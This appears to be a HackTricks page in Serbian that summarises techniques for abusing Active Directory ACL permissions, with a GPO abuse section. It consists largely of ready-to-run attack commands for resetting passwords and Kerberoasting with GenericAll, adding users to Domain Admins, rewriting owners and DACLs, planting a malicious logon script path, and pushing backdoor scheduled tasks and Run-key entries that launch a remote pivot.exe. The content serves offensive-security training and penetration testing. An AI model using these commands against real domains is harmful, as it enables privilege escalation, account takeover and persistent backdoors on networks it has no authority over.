# Zloupotreba Active Directory ACL-ova/ACE-ova

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika sa** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja, proverite originalne članke.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll prava na korisnika**

Ova privilegija daje napadaču potpunu kontrolu nad ciljnim korisničkim nalogom. Kada se `GenericAll` prava potvrde korišćenjem komande `Get-ObjectAcl`, napadač može:

- **Promeniti lozinku cilja**: Korišćenjem `net user <username> <password> /domain`, napadač može resetovati lozinku korisnika.
- **Ciljani Kerberoasting**: Dodeliti SPN korisničkom nalogu kako bi ga učinili pogodnim za kerberoasting, a zatim koristiti Rubeus i targetedKerberoast.py za ekstrakciju i pokušaj dešifrovanja hešova karte za dodeljivanje karata (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Onemogućite pre-autentifikaciju za korisnika, čineći njihov nalog ranjivim na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll prava na grupi**

Ova privilegija omogućava napadaču da manipuliše članstvima u grupama ako imaju `GenericAll` prava na grupi kao što je `Domain Admins`. Nakon identifikacije imena grupe pomoću `Get-NetGroup`, napadač može:

- **Dodati sebe u grupu Domain Admins**: Ovo se može uraditi putem direktnih komandi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Držanje ovih privilegija na objektu računara ili korisničkom nalogu omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje objekta računara.
- **Shadow Credentials**: Koristite ovu tehniku da se lažno predstavljate kao računar ili korisnički nalog iskorišćavanjem privilegija za kreiranje senčnih kredencijala.

## **WriteProperty on Group**

Ako korisnik ima `WriteProperty` prava na svim objektima za određenu grupu (npr., `Domain Admins`), može:

- **Dodati Sebe u Grupu Domain Admins**: Ova metoda, koja se može postići kombinovanjem `net user` i `Add-NetGroupUser` komandi, omogućava eskalaciju privilegija unutar domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ova privilegija omogućava napadačima da se dodaju u specifične grupe, kao što su `Domain Admins`, putem komandi koje direktno manipulišu članstvom u grupi. Korišćenje sledeće sekvence komandi omogućava samododavanje:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Slična privilegija, ovo omogućava napadačima da se direktno dodaju u grupe modifikovanjem svojstava grupa ako imaju `WriteProperty` pravo na tim grupama. Potvrda i izvršenje ove privilegije se vrše sa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Držanje `ExtendedRight` na korisniku za `User-Force-Change-Password` omogućava resetovanje lozinki bez poznavanja trenutne lozinke. Verifikacija ovog prava i njegova eksploatacija mogu se izvršiti putem PowerShell-a ili alternativnih komandnih alata, nudeći nekoliko metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i jednostavne komande za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linux-u, pokazujući svestranost vektora napada.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner na Grupi**

Ako napadač otkrije da ima `WriteOwner` prava nad grupom, može promeniti vlasništvo grupe na sebe. Ovo je posebno značajno kada je u pitanju grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Proces uključuje identifikaciju ispravnog objekta putem `Get-ObjectAcl` i zatim korišćenje `Set-DomainObjectOwner` za modifikaciju vlasnika, bilo putem SID-a ili imena.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite na Korisniku**

Ova dozvola omogućava napadaču da menja svojstva korisnika. Konkretno, sa `GenericWrite` pristupom, napadač može promeniti putanju skripte za prijavljivanje korisnika kako bi izvršio zloćudnu skriptu prilikom prijavljivanja korisnika. To se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljanog korisnika da upućuje na napadačevu skriptu.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite na Grupi**

Sa ovom privilegijom, napadači mogu manipulisati članstvom u grupi, kao što je dodavanje sebe ili drugih korisnika u određene grupe. Ovaj proces uključuje kreiranje objekta kredencijala, korišćenje istog za dodavanje ili uklanjanje korisnika iz grupe, i verifikaciju promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posedovanje AD objekta i imati `WriteDACL` privilegije na njemu omogućava napadaču da sebi dodeli `GenericAll` privilegije nad objektom. To se postiže manipulacijom putem ADSI, što omogućava potpunu kontrolu nad objektom i mogućnost modifikacije njegovih članstava u grupama. Ipak, postoje ograničenja prilikom pokušaja iskorišćavanja ovih privilegija koristeći `Set-Acl` / `Get-Acl` cmdlets iz Active Directory modula.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacija na Domeni (DCSync)**

DCSync napad koristi specifične dozvole replikacije na domenu da oponaša Kontroler Domena i sinhronizuje podatke, uključujući korisničke akreditive. Ova moćna tehnika zahteva dozvole kao što su `DS-Replication-Get-Changes`, omogućavajući napadačima da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Kontroleru Domena. [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## GPO Delegacija <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegacija

Delegirani pristup za upravljanje Grupnim Politicama (GPO) može predstavljati značajne bezbednosne rizike. Na primer, ako je korisniku kao što je `offense\spotless` dodeljeno pravo upravljanja GPO-ima, mogu imati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole se mogu zloupotrebiti u zle svrhe, kako je identifikovano korišćenjem PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumeracija GPO Dozvola

Da bi se identifikovali pogrešno konfigurisani GPO-ovi, PowerSploit-ove cmdlet komande mogu se povezati. Ovo omogućava otkrivanje GPO-ova kojima određeni korisnik ima dozvole za upravljanje: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari sa Primijenjenom Politikom**: Moguće je utvrditi na koje računare se određeni GPO primenjuje, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike Primijenjene na Određeni Računar**: Da biste videli koje politike su primenjene na određeni računar, mogu se koristiti komande kao što je `Get-DomainGPO`.

**OU-ovi sa Primijenjenom Politikom**: Identifikacija organizacionih jedinica (OU) koje su pogođene određenom politikom može se izvršiti korišćenjem `Get-DomainOU`.

Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPO-ova i pronalaženje problema u njima.

### Zloupotreba GPO - New-GPOImmediateTask

Pogrešno konfigurisani GPO-ovi mogu se iskoristiti za izvršavanje koda, na primer, kreiranjem trenutnog zakazanog zadatka. Ovo se može uraditi da bi se dodao korisnik u lokalnu grupu administratora na pogođenim mašinama, značajno povećavajući privilegije:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modul - Zloupotreba GPO

GroupPolicy modul, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-a, kao i postavljanje preferencija kao što su registry vrednosti za izvršavanje backdoor-a na pogođenim računarima. Ova metoda zahteva da se GPO ažurira i da se korisnik prijavi na računar radi izvršenja:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Zloupotreba GPO

SharpGPOAbuse nudi metodu za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili modifikovanjem podešavanja bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva modifikaciju postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Prisilna ažuriranja politika

GPO ažuriranja obično se dešavaju svakih 90 minuta. Da bi se ubrzao ovaj proces, posebno nakon implementacije promene, može se koristiti komanda `gpupdate /force` na ciljanom računaru kako bi se prisililo trenutno ažuriranje politike. Ova komanda osigurava da se sve izmene GPO-a primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Iza kulisa

Prilikom inspekcije Zakazanih zadataka za dati GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka kao što je `evilTask`. Ovi zadaci se kreiraju putem skripti ili alata komandne linije sa ciljem modifikacije ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, kako je prikazano u XML konfiguracionom fajlu generisanom od `New-GPOImmediateTask`, opisuje specifičnosti zakazanog zadatka - uključujući komandu koja treba da se izvrši i njene okidače. Ovaj fajl predstavlja način na koji se zakazani zadaci definišu i upravljaju unutar GPO-a, pružajući metodu za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politike.

### Korisnici i grupe

GPO-ovi takođe omogućavaju manipulaciju članstvima korisnika i grupa na ciljnim sistemima. Uređivanjem fajlova politika za Korisnike i Grupe direktno, napadači mogu dodavati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. Ovo je moguće kroz delegaciju dozvola za upravljanje GPO-om, što omogućava modifikaciju fajlova politika da uključuju nove korisnike ili menjaju članstva grupa.

XML konfiguracioni fajl za Korisnike i Grupe opisuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ova metoda nudi direktan pristup eskalaciji privilegija kroz manipulaciju GPO-om.

Pored toga, dodatne metode za izvršavanje koda ili održavanje postojanosti, kao što su korišćenje skripti za prijavljivanje/odjavljivanje, modifikacija registarskih ključeva za automatsko pokretanje, instalacija softvera putem .msi fajlova ili uređivanje konfiguracija servisa, takođe se mogu razmotriti. Ove tehnike pružaju različite puteve za održavanje pristupa i kontrolu ciljanih sistema kroz zloupotrebu GPO-a.

## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
